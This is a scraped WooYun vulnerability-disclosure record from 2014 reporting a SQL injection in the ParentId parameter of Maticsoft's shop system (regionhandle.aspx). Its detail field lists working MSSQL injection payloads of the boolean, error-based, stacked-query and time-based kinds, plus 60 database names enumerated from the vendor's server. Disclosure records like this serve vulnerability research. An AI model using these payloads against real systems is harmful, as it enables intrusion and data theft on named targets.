{"id": 43166, "wybug_id": "wooyun-2014-083545", "wybug_title": "MaticsoftFK系统通用注入一枚", "wybug_corp": "动软卓越", "wybug_author": "爱上平顶山", "wybug_date": "2014-11-20 11:32", "wybug_open_date": "2015-02-18 11:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-20：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： ... 详细说明：  动软商城   www.maticsoft.comhttp://shop.maticsoft.com/  商城系统  通用注入http://shop1.maticsoft.cn/regionhandle.aspx 页面中  ParentId 过滤不严，造成post注入看过程~Place: POSTParameter: ParentId    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Action=GetChildNode&ParentId=214 AND 2697=2697    Vector: AND [INFERENCE]    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: Action=GetChildNode&ParentId=214 AND 7244=CONVERT(INT,(CHAR(58)+CHAR(104)+CHAR(102)+CHAR(101)+CHAR(58)+(SELECT (CASE WHEN (7244=7244) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(114)+CHAR(121)+CHAR(58)))    Vector: AND [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: Action=GetChildNode&ParentId=214; WAITFOR DELAY '0:0:5';--    Vector: ; IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: Action=GetChildNode&ParentId=214 WAITFOR DELAY '0:0:5'--    Vector: IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'-----available databases [60]:[*] aishangmei[*] beitou[*] butel[*] ceshi[*] demo1[*] f1[*] haozhijie[*] hongxiangtiyu[*] hongye[*] huxingy[*] lvyou[*] master[*] Maticsoft_SAAS[*] Maticsoft_SNS1[*] MaticsoftFK_API[*] MaticsoftFK_edu[*] MaticsoftFK_FW[*] MaticsoftFK_Shop1[*] MaticsoftFK_Shop2[*] MaticsoftFK_Shop3[*] MaticsoftFK_Shop4[*] MaticsoftFK_shopremaigou[*] MaticsoftFK_SNS1[*] MaticsoftFK_SNS2[*] MaticsoftFK_SNS3[*] MaticsoftFK_SNS5[*] MaticsoftFK_Test[*] MaticsoftFK_V1[*] MaticsoftFK_V2[*] MaticsoftFK_V3[*] MaticsoftFK_V4[*] MaticsoftFK_V5[*] meditfood[*] michengbao[*] model[*] msdb[*] panshi[*] saas_1_2[*] shipin[*] shoucang[*] shuti[*] tempdb[*] v198[*] vdc[*] vdingfang[*] vshop[*] vvv[*] wego[*] wuhm[*] xindongda[*] yiwei[*] youjia[*] yudexuan[*] yunan[*] yunbeijia[*] yunshou[*] zhaopin[*] zhibo[*] zhihui[*] zhongshi影响：\n\nok 大半夜 刷点小钱~   漏洞证明：  ...   修复方案：  ...   版权声明：转载请注明来源 爱上平顶山@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-11-20 20:55 |    \t\tki11y0u \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:23        | 好好学习，求带飞~~~~~~~~~~~~~~~~~~~~~~...)\t\t \n  $$$    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}